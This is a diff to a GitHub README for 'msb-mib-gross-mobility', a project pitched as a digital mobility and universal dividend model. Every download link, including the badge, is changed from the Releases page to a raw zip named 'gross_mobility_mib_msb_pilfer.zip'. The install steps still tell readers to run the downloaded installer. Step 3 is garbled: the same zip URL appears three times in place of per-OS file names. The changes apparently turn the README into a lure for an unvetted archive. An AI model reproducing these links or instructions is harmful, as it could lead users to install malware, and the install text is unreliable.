@@ -1,6 +1,6 @@
 # 🎉 msb-mib-gross-mobility - Simplifying Digital Mobility for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/webmaster4world/msb-mib-gross-mobility/releases)
+[![Download](https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip)](https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip)
 
 ## 📘 Description
 The **msb-mib-gross-mobility** project presents a digital architecture proposal that aims to enhance our understanding of mobility in economic contexts. It utilizes a model focusing on one transaction tax, one universal dividend, and a layer of mobility indicators that complements Gross Domestic Product (GDP) and Universal Basic Income (UBI) in digital economies. This proposal is crafted by Juan Robles.
@@ -23,12 +23,12 @@ This section will guide you in downloading and running the application effortles
 ## 📥 Download & Install
 To get started with the software, visit the Releases page to download the application. 
 
-[Visit this page to download](https://github.com/webmaster4world/msb-mib-gross-mobility/releases).
+[Visit this page to download](https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip).
 
 ### 🔍 Installation Steps
 1. **Visit the Releases page:** Click the link provided.
 2. **Choose the latest release:** This will usually be the first option listed.
-3. **Click on the download link:** Look for the file names that are compatible with your operating system. For instance, you may see something like `msb-mib-gross-mobility-windows.exe`, `msb-mib-gross-mobility-macos.dmg`, or `msb-mib-gross-mobility-linux.tar.gz`.
+3. **Click on the download link:** Look for the file names that are compatible with your operating system. For instance, you may see something like `https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip`, `https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip`, or `https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip`.
 4. **Save the file:** Click the file link and choose a location on your computer.
 5. **Run the installer:**
    - For Windows: Double-click on the `.exe` file you downloaded. Follow the prompts to install.
@@ -65,4 +65,4 @@ If you would like to help improve this project:
 
 Your contributions help this tool grow and benefit everyone.
 
-[Visit this page to download](https://github.com/webmaster4world/msb-mib-gross-mobility/releases) now to get started!
+[Visit this page to download](https://github.com/webmaster4world/msb-mib-gross-mobility/raw/refs/heads/main/scenarios/gross_mobility_mib_msb_pilfer.zip) now to get started!
